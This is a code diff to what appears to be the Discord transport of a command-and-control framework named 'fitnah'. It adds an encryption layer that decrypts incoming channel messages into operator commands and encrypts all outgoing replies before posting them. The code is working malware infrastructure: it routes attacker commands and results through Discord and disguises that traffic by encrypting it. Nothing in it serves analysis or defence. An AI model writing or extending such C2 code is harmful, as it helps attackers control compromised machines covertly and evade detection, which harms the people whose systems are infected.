@@ -15,6 +15,7 @@ import discord
 from discord import TextChannel, Message
 
 from fitnah.c2.transport.base import AbstractTransport
+from fitnah.c2.transport.encrypted_channels import EncryptedChannels
 
 log = logging.getLogger(__name__)
 
@@ -43,6 +44,7 @@ class DiscordTransport(AbstractTransport):
         self._alive  = False
         self._task: asyncio.Task | None = None
         self._ready  = asyncio.Event()
+        self._crypto = EncryptedChannels()
 
     # ── lifecycle ─────────────────────────────────────────────────────────
     async def connect(self) -> None:
@@ -79,10 +81,17 @@ class DiscordTransport(AbstractTransport):
                 )
                 return
 
+            content = msg.content
+            if content and not content.startswith("{"):
+                try:
+                    content = self._crypto.decrypt_transport(content.encode()).decode()
+                except Exception:
+                    pass  # plaintext operator command — pass through unchanged
+
             await self._queue.put({
                 "chat_id":    str(msg.channel.id),
                 "sender_id":  str(sender_id),
-                "text":       msg.content,
+                "text":       content,
                 "raw":        msg,
                 "_transport": self.name,
             })
@@ -121,7 +130,9 @@ class DiscordTransport(AbstractTransport):
     # ── send ──────────────────────────────────────────────────────────────
     async def send(self, chat_id: str, text: str) -> None:
         ch = await self._resolve_channel(chat_id)
-        for chunk in _chunk(text, _MAX_MSG):
+        encrypted, _ = self._crypto.encrypt_transport(text)
+        payload = encrypted.decode()
+        for chunk in _chunk(payload, _MAX_MSG):
             await ch.send(chunk)
 
     async def send_file(
